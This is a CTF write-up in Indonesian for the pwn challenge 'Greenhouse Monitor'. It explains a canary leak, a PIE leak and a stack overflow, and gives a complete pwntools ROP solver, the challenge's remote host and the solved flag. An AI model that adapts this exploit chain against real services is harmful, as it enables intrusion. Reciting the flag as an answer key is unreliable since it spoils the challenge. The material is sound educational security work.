# 5. Greenhouse Monitor

**Kategori:** Pwn / Binary Exploitation  
**Target:** `nc cyberleague-shared-nlb-8eebe09f116ebe55.elb.ap-southeast-1.amazonaws.com 30002`  
**Flag format:** `CYBERLEAGUE{...}`



## Deskripsi

PlantWatch 3000 memiliki remote management interface. Monitoring data tampak normal, tetapi beberapa fungsi menyediakan primitive leak yang dapat digabungkan dengan stack overflow.

## 5.1 Mitigasi dan Bug

Mitigasi binary:

```text
NX
PIE
Stack Canary
Full RELRO
```

Kerentanan yang digunakan:

1. **Stack Information Leak** pada `view_sensor_log()`.
2. **PIE Information Leak** pada `firmware_version()`.
3. **Stack Buffer Overflow** pada `set_sensor_name()`.

## 5.2 Stack Layout

Buffer sensor name memiliki kapasitas 80 byte (`0x50`), sedangkan input dapat mencapai 128 byte.

Offset penting:

```text
72 bytes  → canary
80 bytes  → saved RBP
88 bytes  → saved RIP
```

## 5.3 Leak Canary

Menu `3` membocorkan data stack dari sensor log.

Data yang diterima memiliki struktur yang memungkinkan canary dipulihkan:

```python
leak = io.recvn(31)
canary = u64(leak[23:31])
```

Canary yang diperoleh pada verifikasi:

```text
0xf20123dbbe2b1c00
```

## 5.4 Leak PIE

Menu `6` mengeluarkan alamat `main()`:

```text
Firmware base: <address>
```

Basis PIE dihitung:

```text
pie_base = main_leak - ELF.symbols["main"]
```

Hasil verifikasi:

```text
main leak = 0x55d69cd31793
PIE base  = 0x55d69cd30000
```

## 5.5 ROP Chain

Setelah PIE base diketahui, alamat berikut dapat dihitung:

```text
pop_rdi = pie + gadget_pop_rdi
ret     = pie + gadget_ret
puts    = pie + puts@plt
flag    = pie + flag
main    = pie + main
```

Payload:

```text
A × 72
canary
B × 8
ret
pop rdi
flag
puts@plt
main
```

`main()` digunakan untuk menjaga flow agar program tidak langsung berakhir.

## 5.6 Solver

```python
#!/usr/bin/env python3
from pwn import *

HOST = "cyberleague-shared-nlb-8eebe09f116ebe55.elb.ap-southeast-1.amazonaws.com"
PORT = 30002
BIN  = "./dist/chall"

context.binary = elf = ELF(BIN, checksec=False)
context.arch = "amd64"

LOG_LINE = (
    b"[2026-08-10 03:12:01] "
    b"Sensor #1 online -- Zone A\n"
)


def start():
    if args.LOCAL:
        return process(BIN)
    return remote(HOST, PORT)


def leak_canary(io):
    io.sendlineafter(b"> ", b"3")
    io.recvuntil(LOG_LINE)

    leak = io.recvn(31)
    canary = u64(leak[23:31])
    log.success(f"canary = {canary:#018x}")
    return canary


def leak_pie_base(io):
    io.sendlineafter(b"> ", b"6")
    io.recvuntil(b"Firmware base: ")

    main_leak = int(io.recvline().strip(), 16)
    base = main_leak - elf.symbols["main"]

    log.success(f"main leak = {main_leak:#x}")
    log.success(f"PIE base   = {base:#x}")
    return base


def build_payload(canary, base):
    pop_rdi = base + elf.symbols["gadget_pop_rdi"]
    ret     = base + elf.symbols["gadget_ret"]
    puts    = base + elf.plt["puts"]
    flag    = base + elf.symbols["flag"]
    main    = base + elf.symbols["main"]

    payload = flat(
        b"A" * 72,
        canary,
        b"B" * 8,
        ret,
        pop_rdi,
        flag,
        puts,
        main,
    )

    assert len(payload) == 128
    return payload


def main():
    io = start()

    canary = leak_canary(io)
    base = leak_pie_base(io)
    payload = build_payload(canary, base)

    io.sendlineafter(b"> ", b"1")
    io.sendafter(b"Sensor name: ", payload)

    io.recvuntil(b"Sensor name updated: ")
    io.recvline()

    output = io.recvrepeat(2)
    print(output.decode(errors="replace"))
    io.interactive()


if __name__ == "__main__":
    main()
```

## 5.7 Verifikasi

```text
[+] canary = 0xf20123dbbe2b1c00
[+] main leak = 0x55d69cd31793
[+] PIE base   = 0x55d69cd30000
[+] FLAG = CYBERLEAGUE{c4n4ry_p13_r0p_tr1pl3_thr34t}
```

## Flag

```text
CYBERLEAGUE{c4n4ry_p13_r0p_tr1pl3_thr34t}
```

---
